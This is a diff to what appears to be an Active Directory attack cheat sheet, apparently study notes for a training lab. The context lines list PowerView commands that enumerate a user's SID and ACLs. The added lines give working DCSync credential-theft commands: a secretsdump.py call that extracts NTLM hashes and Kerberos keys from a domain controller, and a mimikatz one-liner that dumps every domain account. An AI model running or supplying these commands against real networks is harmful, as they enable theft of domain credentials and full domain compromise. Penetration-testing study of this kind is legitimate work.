@@ -25,3 +25,6 @@ $sid = Convert-NameToSid wley <-> to get SID of the user need PowerView module
 Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid} <-> to get all the ACLs of the user need PowerView module 
 Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl <-> to get the name of ACL  need PowerView and GUID
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}  <-> this cmd will get the ACLs with names need PowerView module 
+#DCSync
+secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5  <-> Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py DCSync attack 
+mimikatz "privilege::debug" "lsadump::dcsync /domain:DOMAIN /all /csv" exit <-> oneliner mimikatz to do dcsync attack you need priveleged user 
